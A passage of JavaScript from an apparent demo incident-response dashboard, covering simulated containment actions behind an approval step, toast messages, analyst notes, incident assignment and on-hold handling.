    "Disable Account": ()=>{ s.account_alice='DISABLED'; },
    "Execute Response Playbook": ()=>{ s.c2='CONTAINED'; s.endpoint='ISOLATED'; s.process_5116='TERMINATED'; s.file_loader='QUARANTINED'; },
  };
  if(map[actionName]) map[actionName]();
}
/* Response task lifecycle: PENDING_APPROVAL → (APPROVED|REJECTED) →
   [QUEUED → EXECUTING → SUCCEEDED|FAILED]. Destructive actions never
   execute on a single click — they must be explicitly approved,
   including by the analyst who requested them, matching the "no
   one-click destructive action" rule. */
function requestResponseAction(action){
  const t0 = nowClock();
  raCounter++;
  const raId = 'RA-'+String(raCounter).padStart(6,'0');
  const inc = currentInc();
  const record = {id:raId, name:action.name, target:action.target, reason:action.reason, impact:action.impact,
    requestedBy:ME, requestedAt:t0, incidentId:inc.id,
    approvalState:'PENDING_APPROVAL', approvedBy:null, approvedAt:null,
    executionState:'—', executedAt:null, verifiedAt:null, result:null, evidenceIds:[]};
  INVESTIGATION_SSOT.responseActions.push(record);
  showToast('Requested — Pending Approval', `${action.name} on ${action.target} requires approval before it executes.`);
  state.timeline.push({t:t0, d:`${action.name} (${action.target}) requested — ${raId} — pending approval`, ev:null, cls:'', cat:'Response'});
  logActivity(`Response requested: ${action.name}`, action.target, 'PENDING APPROVAL');
  render();
}
function approveResponseAction(id){
  const record = INVESTIGATION_SSOT.responseActions.find(r=>r.id===id);
  if(!record || record.approvalState!=='PENDING_APPROVAL') return;
  const t1 = nowClock();
  record.approvalState='APPROVED'; record.approvedBy=ME; record.approvedAt=t1; record.executionState='QUEUED';
  logActivity(`Response approved: ${record.name}`, 'PENDING APPROVAL', 'APPROVED');
  showToast('Approved', `${record.name} approved — adapter selected for ${record.target}.`);
  render();
  setTimeout(()=>{
    record.executionState='EXECUTING';
    render();
    setTimeout(()=>{
      const t2 = nowClock();
      record.executedAt = t2;
      state.timeline.push({t:t2, d:`${record.name} executed on ${record.target}`, ev:null, cls:'', cat:'Response'});
      setTimeout(()=>{
        const t3 = nowClock();
        record.verifiedAt = t3; record.executionState='SUCCEEDED'; record.result='SUCCESS';
        applyStateChange(record.name);
        state.timeline.push({t:t3, d:`${record.name} verified — SUCCESS (${record.id})`, ev:null, cls:'ok', cat:'Response'});
        logActivity(`Response executed and verified: ${record.name}`, 'EXECUTING', 'SUCCEEDED');
        showToast('Verified', `${record.name} completed and verified at ${t3}.`);
        render();
      }, 700);
    }, 500);
  }, 500);
}
function rejectResponseAction(id){
  const record = INVESTIGATION_SSOT.responseActions.find(r=>r.id===id);
  if(!record || record.approvalState!=='PENDING_APPROVAL') return;
  record.approvalState='REJECTED';
  logActivity(`Response rejected: ${record.name}`, 'PENDING APPROVAL', 'REJECTED');
  showToast('Rejected', `${record.name} on ${record.target} was rejected — no action taken.`);
  render();
}
function nowClock(){ return new Date().toTimeString().slice(0,8); }
function showToast(title, body){
  document.getElementById('toastTitle').textContent = title;
  document.getElementById('toastBody').textContent = body;
  const t = document.getElementById('toast'); t.classList.add('show');
  clearTimeout(window.__toastT); window.__toastT = setTimeout(()=>t.classList.remove('show'), 3200);
}

/* ============================================================
   NOTES / ASSIGN
   ============================================================ */
document.getElementById('noteCancel').addEventListener('click', ()=>document.getElementById('noteOverlay').classList.remove('open'));
document.getElementById('noteSave').addEventListener('click', ()=>{
  const txt = document.getElementById('noteText').value.trim();
  if(txt){ state.notes.push({text:txt, time:nowClock(), author:ME, type:'analyst'}); showToast('Note Added','Analyst note saved to investigation.'); }
  document.getElementById('noteText').value='';
  document.getElementById('noteOverlay').classList.remove('open');
  render();
});
document.getElementById('assignCancel').addEventListener('click', ()=>document.getElementById('assignOverlay').classList.remove('open'));
document.getElementById('assignSave').addEventListener('click', ()=>{
  const val = document.getElementById('assignInput').value.trim() || 'Unassigned';
  const inc = currentInc();
  logActivity('Reassigned incident', inc.owner, val);
  inc.owner = val;
  showToast('Incident Assigned', `${state.currentIncident} assigned to ${val}.`);
  document.getElementById('assignOverlay').classList.remove('open');
  render();
});
document.getElementById('holdCancel').addEventListener('click', ()=>document.getElementById('holdOverlay').classList.remove('open'));
document.getElementById('holdSave').addEventListener('click', ()=>{
  const reason = document.getElementById('holdReason').value.trim() || 'Awaiting further information';
  const action = document.getElementById('holdAction').value.trim() || 'No further detail provided.';
  const inc = currentInc();
  logActivity('State changed', inc.status, 'On Hold');
  inc.status = 'On Hold';
  inc.hold = {reason, action, requestedBy: ME, since: nowClock()};
  showToast('Incident On Hold', `${inc.id} placed on hold — ${reason}`);
  document.getElementById('holdReason').value=''; document.getElementById('holdAction').value='';
  document.getElementById('holdOverlay').classList.remove('open');
  render();
});

attachGlobalSearch();
render();
